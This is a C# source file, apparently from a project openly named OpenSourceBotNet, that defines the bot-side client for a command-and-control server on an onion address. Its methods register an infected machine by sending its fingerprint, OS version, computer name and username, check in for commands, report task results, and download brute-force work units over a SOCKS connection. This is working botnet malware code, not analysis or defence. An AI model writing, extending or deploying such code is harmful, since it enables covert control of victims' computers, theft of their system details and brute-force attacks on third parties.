using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace OpenSourceBotNet.Core.Helpers
{
    public static class FluxApiClient
    {
        public static webclient wc;
        public static SocksWebClient swc;

        public static void Initialize()
        {
            wc = WebclientFactory.getMicroWebclient();
            swc = WebclientFactory.getWebClient();
        }

        public static string PostResults(string sTaskUUID, string results, string action)
        {
            string response = "";

            try
            {
                response = wc.post_data(FluxGlobal.sOnion + "api/bots/results.php", "taskuuid=" + System.Uri.EscapeDataString(sTaskUUID) + "&action=" + System.Uri.EscapeDataString(action) + "&results=" + System.Uri.EscapeDataString((results)));
            }
            catch (Exception ex) 
            {
                Console.WriteLine(ex.ToString());
            }

            return response;
        }

        public static void RegisterBot()
        {
            try
            {
                string HtmlResult = wc.post_data(FluxGlobal.sOnion + "api/bots/register.php", "uptime=" + System.Uri.EscapeDataString(Security.FingerPrint.UpTime.Minutes.ToString()) + "&fingerprint=" + System.Uri.EscapeDataString(Security.FingerPrint.Value().ToString()) + "&os=" + System.Uri.EscapeDataString(Environment.OSVersion.ToString()) + "&pcname=" + System.Uri.EscapeDataString(Environment.MachineName) + "&username=" + System.Uri.EscapeDataString(Environment.UserName));
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex.ToString());
            }
        }

        public static string CheckIn()
        {
            string command = "";
            
            try
            {
                command = wc.post_data(FluxGlobal.sOnion + "api/bots/checkin.php", "uptime=" + System.Uri.EscapeDataString(Security.FingerPrint.UpTime.Minutes.ToString()) + "&fingerprint=" + System.Uri.EscapeDataString(Security.FingerPrint.Value().ToString()));
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex.ToString());
            }

            return command;
        }

        public static string GetWork()
        {
            return swc.DownloadString(FluxGlobal.sOnion + "api/bruteforce/getwork.php?slots_open=1");
        }
    }
}
